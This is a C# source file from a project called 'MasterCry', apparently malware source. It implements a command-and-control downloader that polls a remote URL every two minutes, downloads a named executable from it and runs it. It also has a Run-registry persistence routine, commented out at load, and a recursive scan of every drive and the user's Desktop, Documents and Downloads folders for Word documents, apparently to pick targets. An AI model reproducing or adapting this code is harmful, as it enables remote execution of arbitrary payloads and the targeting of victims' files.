
/****************************** ghost1372.github.io ******************************\
*	Module Name:	Form1.cs
*	Project:		MasterCry
*	Copyright (C) 2017 Mahdi Hosseini, All rights reserved.
*	This software may be modified and distributed under the terms of the MIT license.  See LICENSE file for details.
*
*	Written by Mahdi Hosseini <Mahdidvb72@gmail.com>,  2017, 9, 18, 08:45 ب.ظ
*	
***********************************************************************************/

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace MasterCry
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

#region "Downloader"
        //Todo: Test Downloder
        private void Downloader()
        {
            var result = (new WebClient()).DownloadString(BuildVars.Command_URL);

            String link = ExtractData(result,BuildVars.Command_URL_Symbol);
            String ver = ExtractData(result, BuildVars.Command_VER_Symbol);

            var preVer = System_Details.ReadSetting(BuildVars.Config_Command_Version);

            if (preVer.Equals("0") || ver != preVer && !link.Equals("null"))
            {
                   try
                    {
                        System_Details.AddUpdateAppSettings(BuildVars.Config_Command_Version, ver);
                        using (WebClient wc = new WebClient())
                        {
                            wc.DownloadFileCompleted += WebClientDownloadCompleted;
                            wc.DownloadFileAsync(new System.Uri(link),ver + 
                            BuildVars.Exe_Name);
                        }
                    }
                    catch (WebException) { }
                    catch (Exception) { }
            }
        }
        private void WebClientDownloadCompleted(object sender, AsyncCompletedEventArgs args)
        {
            System.Diagnostics.Process.Start(System_Details.ReadSetting(BuildVars.Config_Command_Version) + BuildVars.Exe_Name);
        }
        private string ExtractData(string Result, string Symbol)
        {
            int pFrom = Result.IndexOf(Symbol) + Symbol.Length;
            int pTo = Result.LastIndexOf(Symbol);
            return Result.Substring(pFrom, pTo - pFrom);
        }
        #endregion
        //Check Every 2 Min
        private void tmrURLCheck_Tick(object sender, EventArgs e)
        {
            Downloader();
        }

        #region "Startup"
        private void RegisterInStartup(bool isChecked)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
                    (BuildVars.Registry_Key, true);
            if (isChecked)
            {
                registryKey.SetValue(BuildVars.Registry_AppName, Application.ExecutablePath);
            }
            else
            {
                registryKey.DeleteValue(BuildVars.Registry_AppName);
            }
        }
        public static bool CheckRegistryExists()
        {
            RegistryKey root;
            root = Registry.CurrentUser.OpenSubKey(BuildVars.Registry_Key, false);

            return root.GetValue(BuildVars.Registry_AppName) != null;
        }

        #endregion

        //Todo: Enable StartUp
        private void Form1_Load(object sender, EventArgs e)
        {
            if (!System.IO.File.Exists(BuildVars.Save_Location))
                System_Details.getOperatingSystemInfo();

            //if (!CheckRegistryExists())
            //{
            //    RegisterInStartup(true);
            //}

            foreach (var drv in getDrives())
            {
                var data = GetFileList(drv);
                foreach (var item in data)
                {
                    Console.WriteLine(item);
                    //listBox1.Items.Add(item);
                }
            }
        }
        #region "Search Files on Drives"
        List<string> getDrives()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            List<string> listRange = new List<string>();

            foreach (DriveInfo d in allDrives)
            {

                if (d.DriveType == DriveType.Fixed || d.DriveType == DriveType.Removable)
                {
                    if (d.Name.Equals(OSDrive()))
                    {
                        listRange.Add(d.Name + @"Users\" + Environment.UserName + @"\Desktop");
                        listRange.Add(d.Name + @"Users\" + Environment.UserName + @"\Documents");
                        listRange.Add(d.Name + @"Users\" + Environment.UserName + @"\Downloads");
                    }
                    else
                        listRange.Add(d.Name);
                }
            }
            return listRange;
        }
        public IEnumerable<string> GetFileList(string rootFolderPath)
        {
            string[] exceptions = new string[] { @"C:\System Volume Information", @"C:\$RECYCLE.BIN",
            @"D:\System Volume Information", @"D:\$RECYCLE.BIN",
            @"E:\System Volume Information", @"E:\$RECYCLE.BIN",
            @"F:\System Volume Information", @"F:\$RECYCLE.BIN",
            @"G:\System Volume Information", @"G:\$RECYCLE.BIN",
            @"H:\System Volume Information", @"H:\$RECYCLE.BIN",
            @"I:\System Volume Information", @"I:\$RECYCLE.BIN",
            @"J:\System Volume Information", @"J:\$RECYCLE.BIN",
            @"K:\System Volume Information", @"K:\$RECYCLE.BIN",
            @"L:\System Volume Information", @"L:\$RECYCLE.BIN",
            @"M:\System Volume Information", @"M:\$RECYCLE.BIN"};

            Queue<string> pending = new Queue<string>();
            pending.Enqueue(rootFolderPath);
            string[] tmp;
            while (pending.Count > 0)
            {
                rootFolderPath = pending.Dequeue();
                try
                {
                    tmp = Directory.GetFiles(rootFolderPath).Where(file => exceptions.All(e => !file.StartsWith(e)) && file.EndsWith(".doc", StringComparison.CurrentCultureIgnoreCase)).Union(Directory.GetFiles(rootFolderPath).Where(files => exceptions.All(e => !files.StartsWith(e)) && files.EndsWith(".docx", StringComparison.CurrentCultureIgnoreCase)).Where(d => exceptions.All(e => !d.StartsWith(e)))).ToArray();

                }
                catch (UnauthorizedAccessException) { continue; }
                catch (DirectoryNotFoundException) { continue; }
                for (int i = 0; i < tmp.Length; i++)
                {
                    yield return tmp[i];
                }
                tmp = Directory.GetDirectories(rootFolderPath);
                for (int i = 0; i < tmp.Length; i++)
                {
                    pending.Enqueue(tmp[i]);
                }
            }
        }
        private string OSDrive()
        {
            return Path.GetPathRoot(Environment.SystemDirectory);
        }
#endregion
    }
}
